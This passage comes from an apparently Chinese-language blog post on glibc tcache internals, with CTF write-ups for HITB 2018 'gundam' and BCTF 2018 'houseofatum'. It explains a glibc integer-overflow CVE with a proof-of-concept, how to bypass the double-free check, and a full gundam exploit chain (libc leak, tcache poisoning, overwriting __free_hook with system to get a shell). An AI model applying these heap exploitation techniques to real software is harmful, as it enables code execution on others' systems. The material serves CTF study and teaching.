     if (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (victim);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">                  if (tcache_nb</span><br><span class="line">                      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">                    &#123;</span><br><span class="line">                      tcache_put (victim, tc_idx);</span><br><span class="line">                      return_cached = 1;</span><br><span class="line">                      continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">#endif</span><br><span class="line">                  check_malloced_chunk (av, victim, nb);</span><br><span class="line">                  void *p = chunk2mem (victim);</span><br><span class="line">                  alloc_perturb (p, bytes);</span><br><span class="line">                  return p;</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">                    &#125;</span><br><span class="line">#endif</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="从Tcache取出堆块"><a href="#从Tcache取出堆块" class="headerlink" title="从Tcache取出堆块"></a>从Tcache取出堆块</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* glibc2.26取出chunk并没有严格的检查，由于tcache优先级很高，所以其他的检查机制并没有对tcache发挥过多作用 */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  /* 取出chunk */</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  /* counts记录相应bins的chunk数量,取出时减一 */</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">* 如果用户需要的chunk size 属于 non-large chunk并且 tcache 已经初始化并且对应tcache bins中有符合chunk则取出</span><br><span class="line">* 注意从tcache中取出块是在进入_int_malloc()之前的</span><br><span class="line">*/</span><br><span class="line">if (tc_idx &lt; mp_.tcache_bins </span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  return tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">*   在unsorted bin最后，如果找到了可以返回的块，</span><br><span class="line">*   并且mp_.tcache_unsorted_limit次数小于处理unsorted count(即tcache中装满了对应的chunk)</span><br><span class="line">*   那么就会从其中拉出一个chunk出来返回</span><br><span class="line">*/</span><br><span class="line">.tcache_unsorted_limit = 0 </span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="line">     filling the cache, return one of the cached ones.  */</span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      if (return_cached</span><br><span class="line">      &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">      &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/*  </span><br><span class="line">*    在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk</span><br><span class="line">*    那么在遍历unsorted bin之后则调用一次tcache_get返回给用户使用 </span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">    if (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></div>

<h2 id="释放堆块时"><a href="#释放堆块时" class="headerlink" title="释放堆块时"></a>释放堆块时</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* </span><br><span class="line">*    如果tcache已经初始化</span><br><span class="line">*    并且free的chunk属于non-large chunk</span><br><span class="line">*    如果free的chunk对应的tcache链未满7个 </span><br><span class="line">*    那么就将chunk放入到tcahce中缓存</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>释放堆块时：如果chunk是<strong>non-large chunk</strong>，并且对应bins未满7个，则放入对应bins。</p>
</li>
<li><p>分配堆块时：</p>
<p>（1）如果fastbins或者small bins中成功返回一个需要的chunk，那么对应fastbins或者small bins中的剩余chunk会被放进相应的tcache  bin中，直到相应tcache bin填满7个或者对应的fastbins或者small bins为空。<strong>chunk在tcache bin中顺序与fastbin相反，与small bin中顺序相同。</strong></p>
<p>（2）unsorted bin 中符合用户要求的的chunk取出时，chunk 合并等其他操作，每一个符合要求的chunk会<strong>优先放入tcache</strong>，然后从 tcache 中返回其中一个。如果tcache已满则直接返回。</p>
</li>
<li><p>从tcache中取出堆块。</p>
<p>（1）<strong>在__libc_malloc()调用_int_malloc()前</strong>，如果tcache bin中有符合要求的chunk，则直接返回。</p>
<p>（2）**(默认不执行)**。在unsorted bin最后如果找到了可以返回的块，并且 <strong>mp_.tcache_unsorted_limit(默认为0)</strong> 次数小于处理 unsorted count(即tcache中装满了对应的chunk)那么就会从其中拉出一个chunk出来返回。</p>
<p>（3）在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk 那么在<strong>遍历unsorted bin</strong>之后，则调用一次<strong>tcache_get</strong>返回给用户使用。</p>
</li>
<li><p>tcache中的chunk不会合并。chunk的prev_inuse&#x3D;1。</p>
</li>
</ol>
<h1 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h1><h2 id="cve-2017-17426"><a href="#cve-2017-17426" class="headerlink" title="cve-2017-17426"></a>cve-2017-17426</h2><p>  __libc_malloc()使用request2size()转换堆块为实际大小时，不会进行整数溢出检查。请求一个接近(SIZE_MAX)的堆块将导致溢出，使malloc错误返回tcache bin中的堆块。</p>
<p>源码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    void *x = malloc(10);</span><br><span class="line">    printf(&quot;malloc(10): %p\n&quot;,x);</span><br><span class="line">    free(x);</span><br><span class="line">    </span><br><span class="line">    void *y = malloc(((size_t)~0) - 2);</span><br><span class="line">    printf(&quot;malloc(((size_t)~0) - 2): %p\n&quot;,y);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用glibc-2.26的输出，分配成功。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J423U7BS3AVPUMN.jpg"
                      alt="img"
                ></p>
<p>使用glibc-2.27的输出，nil说明漏洞已修复。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GYTCUQJPMZ3ZT9S.jpg"
                      alt="img"
                ></p>
<h2 id="double-free-check"><a href="#double-free-check" class="headerlink" title="double free check"></a>double free check</h2><p>glibc-2.29新增加double free检查，方法是在tcache_entry结构体中新增加标志位key来检查chunk是否在tcache bin中。当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 double Free 报错。因为chunk的key保存在bk位置，只需将其修改即可绕过double free检查。</p>
<h1 id="经典赛题（已提供相关附件）"><a href="#经典赛题（已提供相关附件）" class="headerlink" title="经典赛题（已提供相关附件）"></a>经典赛题（已提供相关附件）</h1><p>说明：附件中的赛题已经用patchelf改好环境。</p>
<h2 id="HITB-CTF-2018-gundam"><a href="#HITB-CTF-2018-gundam" class="headerlink" title="HITB CTF 2018: gundam"></a>HITB CTF 2018: gundam</h2><p><strong>1.修改rpath。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5UPXC4BVAGDJUG8.jpg"
                      alt="img"
                ></p>
<p><strong>2.检查保护。</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7UJ686BG6C4DDVJ.jpg"
                      alt="img"
                ></p>
<p><strong>3.试运行。</strong></p>
<p>可见为菜单题。</p>
<p>1-创建一个gundam机器人</p>
<p>2-访问gundamu</p>
<p>3-销毁一个gundam</p>
<p>4-炸毁工厂</p>
<p>5-退出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YJXK6788EQ5JJG9.jpg"
                      alt="img"
                ></p>
<p><strong>4.逆向分析。</strong></p>
<p>1-分析Build函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Build()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  void *s; // [rsp+8h] [rbp-18h]</span><br><span class="line">  void *buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  s = 0LL;</span><br><span class="line">  buf = 0LL;</span><br><span class="line">  if ( (unsigned int)dword_20208C &lt;= 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    s = malloc(0x28uLL);</span><br><span class="line">    memset(s, 0, 0x28uLL);</span><br><span class="line">    buf = malloc(0x100uLL);</span><br><span class="line">    if ( !buf )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;error !&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;The name of gundam :&quot;);</span><br><span class="line">    //buf记录名字，没有&#x27;\x00&#x27;限制可能泄露</span><br><span class="line">    read(0, buf, 0x100uLL);</span><br><span class="line">    // (s+8)位置 -&gt; buf</span><br><span class="line">    *((_QWORD *)s + 1) = buf;</span><br><span class="line">    printf(&quot;The type of the gundam :&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    //type &lt; 3</span><br><span class="line">    if ( v1 &gt;= 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid.&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    // (s+16) -&gt; type</span><br><span class="line">    strcpy((char *)s + 16, &amp;aFreedom[20 * v1]);</span><br><span class="line">    // s-&gt;1 标记为在使用。</span><br><span class="line">    *(_DWORD *)s = 1;</span><br><span class="line">    for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !qword_2020A0[i] )</span><br><span class="line">      &#123;</span><br><span class="line">          //Factory[9]，工厂数组。</span><br><span class="line">        qword_2020A0[i] = s;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 换原为NumOfGundam，记录gundam的数量</span><br><span class="line">    ++dword_20208C;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不难分析出gundam结构体</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct gundam&#123;</span><br><span class="line">    int flag;</span><br><span class="line">    char *buf;</span><br><span class="line">    char type[60];</span><br><span class="line">&#125;gundam;</span><br><span class="line">struct gundam *factory[9]</span><br></pre></td></tr></table></figure></div>

<p>2-Visit函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Visit()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( NumOfGundam )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        //将每个gundma的buf和Type打印出来。</span><br><span class="line">      if ( factory[i] &amp;&amp; *(_DWORD *)factory[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;\nGundam[%u] :%s&quot;, i, *(const char **)(factory[i] + 8LL));</span><br><span class="line">        printf(&quot;Type[%u] :%s\n&quot;, i, (const char *)(factory[i] + 16LL));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam produced!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3-Destroy函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Destroy()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  if ( NumOfGundam )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Which gundam do you want to Destory:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    if ( v1 &gt; 8 || !factory[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    // 使用标记置为0</span><br><span class="line">    *(_DWORD *)factory[v1] = 0;</span><br><span class="line">    // name存在UAF漏洞。</span><br><span class="line">    free(*(void **)(factory[v1] + 8LL));</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  // 并没有将NumOfGundam数量-1</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>4-BlowUp函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 BlowUp()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( factory[i] &amp;&amp; !*(_DWORD *)factory[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      free((void *)factory[i]);</span><br><span class="line">      factory[i] = 0LL;</span><br><span class="line">      // 只把标记为置为0，存在uaf。</span><br><span class="line">      --NumOfGundam;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.漏洞利用</strong></p>
<p>（1）利用unsorted bin attack泄露main_arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted bin，剩下一个阻隔top chunk防止合并。可以看到unsorted bin中的chunk的fd和bk指向了一个栈地址(main_arena+88)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZEASEE9NZU44C5S.jpg"
                      alt="img"
                ></p>
<p>blow up后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_79F5P5RSTUVS4CX.jpg"
                      alt="img"
                ></p>
<p>计算这个栈地址与libc基地址的偏移。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_H876K6X845YEQTM.jpg"
                      alt="img"
                ></p>
<p>偏移为：0x3dac78</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BMEDZ8WHXWHZ6GA.jpg"
                      alt="img"
                ></p>
<p>在申请8个chunk，将unsorted bin中的chunk申请出来，再利用visit()函数泄露main_arena+88处的栈地址。</p>
<p>此时需要注意，chunk优先从tcache取出，然后Type[7]才是unsorted bin中的chunk。由于第8个chunk的fd指向main_arena+88处的地址，</p>
<p>所以此时只需要接收6个字节（因为64位栈地址前2字节为’\x00’,并且用%s打印地址）然后用’\x00’补齐即可。</p>
<p>再用main_arena+88处的地址减去上面计算出的固定偏移即可得到栈的基地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_82AMDYGDZBJYGEX.jpg"
                      alt="img"
                ></p>
<p>进而可以由libc-2.26.so得到system和__free_hook地址。</p>
<p>（2）利用double free制造tcache poisoning到&amp;__free_hook</p>
<p>依次释放2，1，0，0。此时tcache bin状态如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_R5CPWZN2CM9D8X6.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5NNQRGXBK3K8GET.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4FZWRZH9EK2D29U.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XQ7DM265PKATFMY.jpg"
                      alt="img"
                ></p>
<p>blow up 后</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AKAUSN3ZH6Q75K6.jpg"
                      alt="img"
                ></p>
<p>已经形成了double free。此时在申请一个堆块将会把chunk0申请出来，将其内容改为__free_hook的地址。</p>
<p>因为此时chunk0依然在tcache bin(0x110)的链上，所以__free_hook会被挂在tcache bins的链上。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VRCZDXZ7HZPPG3A.jpg"
                      alt="img"
                ></p>
<p>（3）将物理堆块为chunk0，逻辑为chunk1的factory[1]_buf改写为’&#x2F;bin&#x2F;sh\x00’，修改__free_hook为system地址。</p>
<p>修改factory[1]_buf为’&#x2F;bin&#x2F;sh\x00’</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GBGYY98JXSD8Z27.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DYS48TUVAJY4QZ2.jpg"
                      alt="img"
                ></p>
<p>此时tcache bin中还剩下__free_hook地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YDCJ64QZPUGV3WK.jpg"
                      alt="img"
                ></p>
<p>再次申请得到__free__hook+0x10处的堆块，此时修改__free_hook为system。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VRQR9A9XJBAS7JG.jpg"
                      alt="img"
                ></p>
<p>（4）free(‘&#x2F;bin&#x2F;sh\x00’);</p>
<p>最后 destory(1)，也就是free(‘&#x2F;bin&#x2F;sh\x00’)即可getshell</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SMCEP4CKXCCRSW4.jpg"
                      alt="img"
                ></p>
<h2 id="BCTF2018-houseofatum"><a href="#BCTF2018-houseofatum" class="headerlink" title="BCTF2018-houseofatum"></a>BCTF2018-houseofatum</h2><p><strong>1.修改rpath</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PFF4YXVDNYUVCXK.jpg"
                      alt="img"
                ></p>
<p><strong>2.检查保护</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZEK39HH86HYX8Y.jpg"
                      alt="img"
                ></p>
<p><strong>3.试运行</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QWRKEKAF4E79ZBZ.jpg"
                      alt="img"
                ></p>
<p><strong>4.逆向分析</strong></p>
<p>1-alloc函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int alloc()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line">  // 只允许两个堆块同时存在</span><br><span class="line">  for ( i = 0; i &lt;= 1 &amp;&amp; *((_QWORD *)&amp;notes + i); ++i );</span><br><span class="line">  if ( i == 2 )</span><br><span class="line">    return puts(&quot;Too many notes!&quot;);</span><br><span class="line">  printf(&quot;Input the content:&quot;);</span><br><span class="line">  //  利用notes[i]管理note，实际大小为0x50。</span><br><span class="line">  *((_QWORD *)&amp;notes + i) = malloc(0x48uLL);</span><br><span class="line">  readn(*((void **)&amp;notes + i), 0x48uLL);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">ssize_t __fastcall readn(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  return read(0, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>2-edit函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &gt; 1 || !*((_QWORD *)&amp;notes + v1) )</span><br><span class="line">    return puts(&quot;No such note!&quot;);</span><br><span class="line">  printf(&quot;Input the content:&quot;);</span><br><span class="line">  // 读取0x48可能存在泄露</span><br><span class="line">  readn(*((void **)&amp;notes + v1), 0x48uLL);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3-del函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 del()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+0h] [rbp-10h]</span><br><span class="line">  char v2[2]; // [rsp+6h] [rbp-Ah] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &lt;= 1 &amp;&amp; *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)&amp;notes + v1));</span><br><span class="line">    printf(&quot;Clear?(y/n):&quot;);</span><br><span class="line">    // 输入n，可以导致UAF漏洞。</span><br><span class="line">    readn(v2, 2uLL);</span><br><span class="line">    if ( v2[0] == &#x27;y&#x27; )</span><br><span class="line">      *((_QWORD *)&amp;notes + v1) = 0LL;</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such note!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>4-show函数</p>
